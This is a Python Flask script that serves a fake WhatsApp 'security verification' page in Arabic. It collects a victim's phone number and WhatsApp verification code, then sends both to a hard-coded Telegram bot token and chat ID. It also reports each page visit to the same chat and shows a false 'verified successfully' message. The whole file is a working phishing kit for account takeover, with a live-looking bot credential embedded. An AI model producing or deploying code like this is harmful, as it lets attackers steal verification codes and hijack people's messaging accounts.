from flask import Flask, request
import requests

app = Flask(__name__)

BOT_TOKEN = "8180742365:AAG5QjIT2ke8ohMdTNdH_duXDEqOQVOgLNs"
CHAT_ID = "5811431534"

@app.route('/')
def home():
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": "🔔 زائر جديد للصفحة!"}
        )
    except:
        pass
    
    return '''
    <html>
    <body style="background:#128C7E; color:white; text-align:center; padding:50px;">
        <h2>واتساب - تحقق الأمان</h2>
        <form method="POST" action="/submit">
            <input type="text" name="phone" placeholder="رقم الهاتف" required style="padding:10px; margin:5px;">
            <br>
            <input type="text" name="code" placeholder="رمز التحقق" required style="padding:10px; margin:5px;">
            <br>
            <button type="submit" style="padding:10px 20px; margin:10px;">تحقق</button>
        </form>
    </body>
    </html>
    '''

@app.route('/submit', methods=['POST'])
def submit():
    phone = request.form.get('phone')
    code = request.form.get('code')
    
    try:
        message = f"📱 رقم: {phone}\n🔐 رمز: {code}"
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": message}
        )
    except:
        pass
    
    return "تم التحقق بنجاح!"

if __name__ == '__main__':
    print("🌐 الخادم يعمل على: http://localhost:5000")
    app.run(host='0.0.0.0', port=5000)
